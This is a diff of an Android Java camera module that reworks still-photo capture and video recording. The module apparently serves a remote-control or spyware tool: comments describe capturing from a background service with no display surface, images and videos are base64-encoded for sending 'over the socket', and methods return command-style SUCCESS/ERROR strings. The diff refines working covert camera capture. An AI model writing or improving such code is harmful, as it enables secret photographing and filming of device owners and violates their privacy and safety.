@@ -31,13 +31,17 @@ import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
 public class CameraModule {
     private static final String TAG = "CameraModule";
-    private static final int AE_CONVERGE_TIMEOUT_MS = 4000;
-    private static final int CAPTURE_TIMEOUT_MS     = 10000;
-    private static final int MAX_RETRY_ATTEMPTS     = 2;
+
+    // ── How long to let the sensor/AE warm up before firing the capture.
+    // 1500ms is reliable on mid-range devices without a live preview surface.
+    private static final long   WARMUP_MS           = 1500;
+    private static final int    CAPTURE_TIMEOUT_MS  = 15000;
+    private static final int    MAX_RETRY_ATTEMPTS  = 2;
 
     private final Context       context;
     private final CameraManager cameraManager;
@@ -57,6 +61,8 @@ public class CameraModule {
     private boolean       isRecordingVideo = false;
     private String        currentVideoPath;
 
+    // ── Constructor ───────────────────────────────────────────────────────────
+
     public CameraModule(Context context) {
         this.context       = context;
         this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
@@ -65,6 +71,8 @@ public class CameraModule {
         backgroundHandler = new Handler(backgroundThread.getLooper());
         findCameras();
     }
+
+    // ── Camera discovery ──────────────────────────────────────────────────────
 
     private void findCameras() {
         try {
@@ -77,17 +85,20 @@ public class CameraModule {
             }
             currentCameraId    = backCameraId != null ? backCameraId : frontCameraId;
             isUsingFrontCamera = currentCameraId != null && currentCameraId.equals(frontCameraId);
-            Log.d(TAG, "Cameras back:" + backCameraId + " front:" + frontCameraId + " current:" + currentCameraId);
+            Log.d(TAG, "Cameras — back:" + backCameraId + " front:" + frontCameraId
+                    + " current:" + currentCameraId);
         } catch (Exception e) {
             Log.e(TAG, "findCameras error", e);
         }
     }
 
+    // ── Switch camera ─────────────────────────────────────────────────────────
+
     public String switchCamera() {
         closeCamera();
         if (isUsingFrontCamera) {
-            if (backCameraId  == null) return "ERROR: No back camera";
-            currentCameraId = backCameraId; isUsingFrontCamera = false;
+            if (backCameraId == null)  return "ERROR: No back camera";
+            currentCameraId = backCameraId;  isUsingFrontCamera = false;
             return "SUCCESS: Switched to back camera";
         } else {
             if (frontCameraId == null) return "ERROR: No front camera";
@@ -97,6 +108,8 @@ public class CameraModule {
     }
 
     public String getCurrentCamera() { return isUsingFrontCamera ? "front" : "back"; }
+
+    // ── Resource management ───────────────────────────────────────────────────
 
     private synchronized void closeCamera() {
         try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
@@ -109,12 +122,17 @@ public class CameraModule {
                 == PackageManager.PERMISSION_GRANTED;
     }
 
-    // ── Best photo size: largest JPEG up to 12 MP ─────────────────────────────
+    // ── Size helpers ──────────────────────────────────────────────────────────
 
+    /**
+     * Returns the largest JPEG size up to ~12 MP (4032 × 3024).
+     * Capping prevents excessively large base64 payloads over the socket.
+     */
     private Size getBestPhotoSize() {
         try {
-            CameraCharacteristics c = cameraManager.getCameraCharacteristics(currentCameraId);
-            StreamConfigurationMap m = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            StreamConfigurationMap m = cameraManager
+                    .getCameraCharacteristics(currentCameraId)
+                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
             if (m == null) return new Size(3840, 2160);
             Size[] sizes = m.getOutputSizes(ImageFormat.JPEG);
             if (sizes == null || sizes.length == 0) return new Size(3840, 2160);
@@ -125,27 +143,26 @@ public class CameraModule {
                     best = s;
                 }
             }
-            Log.d(TAG, "Best photo size: " + best.getWidth() + "x" + best.getHeight());
+            Log.d(TAG, "Best photo size: " + best.getWidth() + "×" + best.getHeight());
             return best;
         } catch (Exception e) { return new Size(3840, 2160); }
     }
 
-    // ── Best video size: prefer 1080p ─────────────────────────────────────────
-
+    /** Prefers 1080p; falls back to the largest size ≤ 1080p. */
     private Size getBestVideoSize() {
         try {
-            CameraCharacteristics c = cameraManager.getCameraCharacteristics(currentCameraId);
-            StreamConfigurationMap m = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            StreamConfigurationMap m = cameraManager
+                    .getCameraCharacteristics(currentCameraId)
+                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
             if (m == null) return new Size(1280, 720);
             Size[] sizes = m.getOutputSizes(MediaRecorder.class);
             if (sizes == null || sizes.length == 0) return new Size(1280, 720);
-            for (Size s : sizes) {
-                if (s.getWidth() == 1920 && s.getHeight() == 1080) return s;
-            }
+            for (Size s : sizes) if (s.getWidth() == 1920 && s.getHeight() == 1080) return s;
             Size best = sizes[0];
             for (Size s : sizes) {
                 if (s.getWidth() <= 1920 && s.getHeight() <= 1080
-                        && (long) s.getWidth() * s.getHeight() > (long) best.getWidth() * best.getHeight()) {
+                        && (long) s.getWidth() * s.getHeight()
+                           > (long) best.getWidth() * best.getHeight()) {
                     best = s;
                 }
             }
@@ -153,110 +170,170 @@ public class CameraModule {
         } catch (Exception e) { return new Size(1280, 720); }
     }
 
-    // ── takePhoto with AE convergence ─────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    //  takePhoto
+    //
+    //  Strategy: open camera → start a repeating PREVIEW request → wait
+    //  WARMUP_MS for AE/AF to settle → fire one STILL_CAPTURE request →
+    //  wait for the image.
+    //
+    //  The repeating preview request is key: it drives the camera ISP and
+    //  lets AE converge even from a background service with no display surface.
+    //  We use the same ImageReader surface for both the preview frames (which
+    //  we discard) and the final still capture.
+    // ─────────────────────────────────────────────────────────────────────────
 
     public String takePhoto() {
         if (!checkPermission())      return "ERROR: No camera permission";
         if (currentCameraId == null) return "ERROR: No camera available";
+
         for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
             closeCamera();
             String r = doTakePhoto();
             if (!r.startsWith("ERROR")) return r;
-            Log.w(TAG, "Attempt " + (attempt + 1) + " failed: " + r);
-            try { Thread.sleep(600); } catch (InterruptedException ignored) {}
+            Log.w(TAG, "Photo attempt " + (attempt + 1) + " failed: " + r);
+            try { Thread.sleep(700); } catch (InterruptedException ignored) {}
         }
         return "ERROR: All capture attempts failed";
     }
 
     private String doTakePhoto() {
-        final AtomicReference<String> result = new AtomicReference<>(null);
-        final CountDownLatch latch = new CountDownLatch(1);
+        final AtomicReference<String> result  = new AtomicReference<>(null);
+        final CountDownLatch           latch   = new CountDownLatch(1);
+        final AtomicBoolean            fired   = new AtomicBoolean(false);
+
         try {
             Size photoSize = getBestPhotoSize();
-            imageReader = ImageReader.newInstance(photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 2);
+            Log.d(TAG, "Photo size: " + photoSize.getWidth() + "×" + photoSize.getHeight());
+
+            imageReader = ImageReader.newInstance(
+                    photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 3);
+
+            // The listener captures whichever image arrives AFTER we fire the
+            // still-capture request (i.e. we ignore preview frames by checking fired).
             imageReader.setOnImageAvailableListener(reader -> {
+                if (!fired.get()) return; // still in warm-up — discard preview frame
                 try (Image img = reader.acquireLatestImage()) {
-                    if (img == null) { result.set("ERROR: Null image"); return; }
-                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                    byte[] bytes   = new byte[buf.remaining()];
+                    if (img == null) return;
+                    ByteBuffer buf   = img.getPlanes()[0].getBuffer();
+                    byte[]     bytes = new byte[buf.remaining()];
                     buf.get(bytes);
                     result.set(Base64.encodeToString(bytes, Base64.NO_WRAP));
                     Log.d(TAG, "Photo encoded: " + bytes.length + " bytes");
-                } catch (Exception e) { result.set("ERROR: " + e.getMessage()); }
-                finally { latch.countDown(); }
+                } catch (Exception e) {
+                    result.set("ERROR: " + e.getMessage());
+                } finally {
+                    latch.countDown();
+                }
             }, backgroundHandler);
 
             cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
-                @Override public void onOpened(CameraDevice device) {
+                @Override
+                public void onOpened(CameraDevice device) {
                     cameraDevice = device;
                     try {
                         List<Surface> surfaces = new ArrayList<>();
                         surfaces.add(imageReader.getSurface());
-                        device.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
-                            @Override public void onConfigured(CameraCaptureSession session) {
-                                captureSession = session;
-                                try { runAeConvergenceThenCapture(session, device, result, latch); }
-                                catch (Exception e) { result.set("ERROR: " + e.getMessage()); latch.countDown(); }
-                            }
-                            @Override public void onConfigureFailed(CameraCaptureSession s) {
-                                result.set("ERROR: Session configure failed"); latch.countDown();
-                            }
-                        }, backgroundHandler);
-                    } catch (Exception e) { result.set("ERROR: " + e.getMessage()); latch.countDown(); }
+
+                        device.createCaptureSession(surfaces,
+                                new CameraCaptureSession.StateCallback() {
+                                    @Override
+                                    public void onConfigured(CameraCaptureSession session) {
+                                        captureSession = session;
+                                        try {
+                                            startWarmupThenCapture(session, device, result, latch, fired);
+                                        } catch (Exception e) {
+                                            result.set("ERROR: " + e.getMessage());
+                                            latch.countDown();
+                                        }
+                                    }
+                                    @Override
+                                    public void onConfigureFailed(CameraCaptureSession s) {
+                                        result.set("ERROR: Session configure failed");
+                                        latch.countDown();
+                                    }
+                                }, backgroundHandler);
+                    } catch (Exception e) {
+                        result.set("ERROR: " + e.getMessage());
+                        latch.countDown();
+                    }
                 }
-                @Override public void onDisconnected(CameraDevice d) { d.close(); result.set("ERROR: Disconnected"); latch.countDown(); }
-                @Override public void onError(CameraDevice d, int e)  { d.close(); result.set("ERROR: Camera error " + e); latch.countDown(); }
+                @Override public void onDisconnected(CameraDevice d) {
+                    d.close(); result.set("ERROR: Camera disconnected"); latch.countDown();
+                }
+                @Override public void onError(CameraDevice d, int e) {
+                    d.close(); result.set("ERROR: Camera error " + e); latch.countDown();
+                }
             }, backgroundHandler);
 
             boolean done = latch.await(CAPTURE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
             closeCamera();
-            if (!done) return "ERROR: Capture timeout";
-            return result.get() != null ? result.get() : "ERROR: No result";
+            if (!done)              return "ERROR: Capture timeout";
+            if (result.get() == null) return "ERROR: No result";
+            return result.get();
+
         } catch (Exception e) {
             closeCamera();
             return "ERROR: " + e.getMessage();
         }
     }
 
-    private void runAeConvergenceThenCapture(
-            CameraCaptureSession session, CameraDevice device,
-            AtomicReference<String> result, CountDownLatch latch) throws CameraAccessException {
+    /**
+     * Starts a repeating PREVIEW request to warm up AE/AF.
+     * After WARMUP_MS, atomically marks fired=true and issues STILL_CAPTURE.
+     */
+    private void startWarmupThenCapture(
+            CameraCaptureSession session,
+            CameraDevice device,
+            AtomicReference<String> result,
+            CountDownLatch latch,
+            AtomicBoolean fired) throws CameraAccessException {
 
-        CaptureRequest.Builder previewBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+        CaptureRequest.Builder previewBuilder =
+                device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
         previewBuilder.addTarget(imageReader.getSurface());
-        previewBuilder.set(CaptureRequest.CONTROL_MODE,   CaptureRequest.CONTROL_MODE_AUTO);
+        previewBuilder.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
         previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
         previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
 
-        final long    startMs  = System.currentTimeMillis();
-        final boolean[] fired  = {false};
+        session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler);
+        Log.d(TAG, "Preview started — waiting " + WARMUP_MS + "ms for AE/AF to settle");
 
-        session.setRepeatingRequest(previewBuilder.build(),
-                new CameraCaptureSession.CaptureCallback() {
-                    @Override
-                    public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest req, TotalCaptureResult captureResult) {
-                        if (fired[0]) return;
-                        Integer aeState = captureResult.get(CaptureResult.CONTROL_AE_STATE);
-                        long    elapsed = System.currentTimeMillis() - startMs;
-                        boolean aeReady = aeState == null
-                                || aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED
-                                || aeState == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED
-                                || elapsed >= AE_CONVERGE_TIMEOUT_MS;
-                        if (!aeReady) return;
-                        fired[0] = true;
-                        Log.d(TAG, "AE converged (state=" + aeState + ", " + elapsed + "ms) → firing still capture");
-                        try {
-                            s.stopRepeating();
-                            CaptureRequest.Builder stillBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                            stillBuilder.addTarget(imageReader.getSurface());
-                            stillBuilder.set(CaptureRequest.JPEG_QUALITY,   (byte) 97);
-                            stillBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
-                            stillBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-                            stillBuilder.set(CaptureRequest.JPEG_ORIENTATION, getSensorOrientation());
-                            s.capture(stillBuilder.build(), null, backgroundHandler);
-                        } catch (Exception e) { result.set("ERROR: Still capture — " + e.getMessage()); latch.countDown(); }
-                    }
-                }, backgroundHandler);
+        // After warmup delay, stop preview and fire still capture
+        backgroundHandler.postDelayed(() -> {
+            try {
+                session.stopRepeating();
+
+                // Mark fired BEFORE sending the capture request so the
+                // ImageAvailableListener knows to keep the next image.
+                fired.set(true);
+
+                CaptureRequest.Builder stillBuilder =
+                        device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                stillBuilder.addTarget(imageReader.getSurface());
+                stillBuilder.set(CaptureRequest.JPEG_QUALITY,    (byte) 97);
+                stillBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
+                stillBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+                stillBuilder.set(CaptureRequest.JPEG_ORIENTATION, getSensorOrientation());
+                stillBuilder.set(CaptureRequest.CONTROL_CAPTURE_INTENT,
+                        CaptureRequest.CONTROL_CAPTURE_INTENT_STILL_CAPTURE);
+
+                session.capture(stillBuilder.build(),
+                        new CameraCaptureSession.CaptureCallback() {
+                            @Override
+                            public void onCaptureFailed(CameraCaptureSession s,
+                                    CaptureRequest req, CaptureFailure failure) {
+                                result.set("ERROR: Capture failed (reason=" + failure.getReason() + ")");
+                                latch.countDown();
+                            }
+                        }, backgroundHandler);
+
+                Log.d(TAG, "Still capture request fired");
+            } catch (Exception e) {
+                result.set("ERROR: " + e.getMessage());
+                latch.countDown();
+            }
+        }, WARMUP_MS);
     }
 
     private int getSensorOrientation() {
@@ -267,7 +344,9 @@ public class CameraModule {
         } catch (Exception e) { return 90; }
     }
 
-    // ── Video recording ───────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    //  Video recording
+    // ─────────────────────────────────────────────────────────────────────────
 
     public String startRecording(String args) {
         if (!checkPermission())      return "ERROR: No camera permission";
@@ -280,17 +359,18 @@ public class CameraModule {
         }
 
         closeCamera();
-        final CountDownLatch latch       = new CountDownLatch(1);
-        final AtomicReference<String> sr = new AtomicReference<>(null);
+        final CountDownLatch         latch = new CountDownLatch(1);
+        final AtomicReference<String> sr   = new AtomicReference<>(null);
 
         try {
             Size videoSize = getBestVideoSize();
-            Log.d(TAG, "Video size: " + videoSize.getWidth() + "x" + videoSize.getHeight());
+            Log.d(TAG, "Video size: " + videoSize.getWidth() + "×" + videoSize.getHeight());
 
             File dir = context.getExternalFilesDir("videos");
             if (dir != null && !dir.exists()) dir.mkdirs();
             String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
-            currentVideoPath = (dir != null ? dir.getAbsolutePath() : context.getCacheDir().getAbsolutePath())
+            currentVideoPath = (dir != null ? dir.getAbsolutePath()
+                                            : context.getCacheDir().getAbsolutePath())
                     + "/VID_" + ts + ".mp4";
 
             videoRecorder = new MediaRecorder();
@@ -310,7 +390,7 @@ public class CameraModule {
 
             final Surface recorderSurface = videoRecorder.getSurface();
 
-            // Dummy preview surface so camera2 doesn't complain
+            // Small dummy ImageReader — some devices need ≥2 output surfaces
             imageReader = ImageReader.newInstance(320, 240, ImageFormat.YUV_420_888, 2);
             imageReader.setOnImageAvailableListener(
                     r -> { try (Image i = r.acquireLatestImage()) { /* discard */ } catch (Exception ignored) {} },
@@ -323,36 +403,44 @@ public class CameraModule {
                         List<Surface> surfaces = new ArrayList<>();
                         surfaces.add(recorderSurface);
                         surfaces.add(imageReader.getSurface());
-                        device.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
-                            @Override public void onConfigured(CameraCaptureSession session) {
-                                captureSession = session;
-                                try {
-                                    CaptureRequest.Builder b = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
-                                    b.addTarget(recorderSurface);
-                                    b.addTarget(imageReader.getSurface());
-                                    b.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
-                                    b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
-                                    b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-                                    session.setRepeatingRequest(b.build(), null, backgroundHandler);
-                                    videoRecorder.start();
-                                    isRecordingVideo = true;
-                                    sr.set("SUCCESS: Recording started");
-                                    Log.d(TAG, "🎥 Recording: " + currentVideoPath);
-                                } catch (Exception e) { sr.set("ERROR: " + e.getMessage()); }
-                                finally { latch.countDown(); }
-                            }
-                            @Override public void onConfigureFailed(CameraCaptureSession s) {
-                                sr.set("ERROR: Session configure failed"); latch.countDown();
-                            }
-                        }, backgroundHandler);
+                        device.createCaptureSession(surfaces,
+                                new CameraCaptureSession.StateCallback() {
+                                    @Override public void onConfigured(CameraCaptureSession session) {
+                                        captureSession = session;
+                                        try {
+                                            CaptureRequest.Builder b =
+                                                    device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
+                                            b.addTarget(recorderSurface);
+                                            b.addTarget(imageReader.getSurface());
+                                            b.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
+                                            b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
+                                            b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+                                            session.setRepeatingRequest(b.build(), null, backgroundHandler);
+                                            videoRecorder.start();
+                                            isRecordingVideo = true;
+                                            sr.set("SUCCESS: Recording started — " + currentVideoPath);
+                                            Log.d(TAG, "🎥 Recording started: " + currentVideoPath);
+                                        } catch (Exception e) {
+                                            sr.set("ERROR: " + e.getMessage());
+                                        } finally { latch.countDown(); }
+                                    }
+                                    @Override public void onConfigureFailed(CameraCaptureSession s) {
+                                        sr.set("ERROR: Session configure failed"); latch.countDown();
+                                    }
+                                }, backgroundHandler);
                     } catch (Exception e) { sr.set("ERROR: " + e.getMessage()); latch.countDown(); }
                 }
-                @Override public void onDisconnected(CameraDevice d) { d.close(); sr.set("ERROR: Disconnected"); latch.countDown(); }
-                @Override public void onError(CameraDevice d, int e)  { d.close(); sr.set("ERROR: Camera error " + e); latch.countDown(); }
+                @Override public void onDisconnected(CameraDevice d) {
+                    d.close(); sr.set("ERROR: Camera disconnected"); latch.countDown();
+                }
+                @Override public void onError(CameraDevice d, int e) {
+                    d.close(); sr.set("ERROR: Camera error " + e); latch.countDown();
+                }
             }, backgroundHandler);
 
             latch.await(8, TimeUnit.SECONDS);
             return sr.get() != null ? sr.get() : "ERROR: Timeout starting recording";
+
         } catch (Exception e) {
             Log.e(TAG, "startRecording error", e);
             releaseVideoRecorder();
@@ -371,7 +459,7 @@ public class CameraModule {
             File f = new File(currentVideoPath);
             if (!f.exists() || f.length() == 0) return "ERROR: Video file empty or missing";
 
-            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes");
+            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes → encoding...");
             byte[] bytes = readFileToBytes(f);
             String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
@@ -383,6 +471,7 @@ public class CameraModule {
             resp.put("file_data", b64);
             resp.put("path",      f.getAbsolutePath());
             return resp.toString();
+
         } catch (Exception e) {
             Log.e(TAG, "stopRecording error", e);
             return "ERROR: " + e.getMessage();
@@ -440,10 +529,10 @@ public class CameraModule {
                 if (m != null) {
                     Size[] js = m.getOutputSizes(ImageFormat.JPEG);
                     if (js != null && js.length > 0)
-                        sb.append("  Max JPEG: ").append(js[0].getWidth()).append("x").append(js[0].getHeight()).append("\n");
+                        sb.append("  Max JPEG: ").append(js[0].getWidth()).append("×").append(js[0].getHeight()).append("\n");
                     Size[] vs = m.getOutputSizes(MediaRecorder.class);
                     if (vs != null && vs.length > 0)
-                        sb.append("  Max Video: ").append(vs[0].getWidth()).append("x").append(vs[0].getHeight()).append("\n");
+                        sb.append("  Max Video: ").append(vs[0].getWidth()).append("×").append(vs[0].getHeight()).append("\n");
                 }
             }
             return "SUCCESS: " + sb;
@@ -477,6 +566,8 @@ public class CameraModule {
     }
 
     public String simpleCapture() { return "SUCCESS: Camera accessible"; }
+
+    // ── Helpers ───────────────────────────────────────────────────────────────
 
     private byte[] readFileToBytes(File f) throws IOException {
         try (FileInputStream fis = new FileInputStream(f)) {
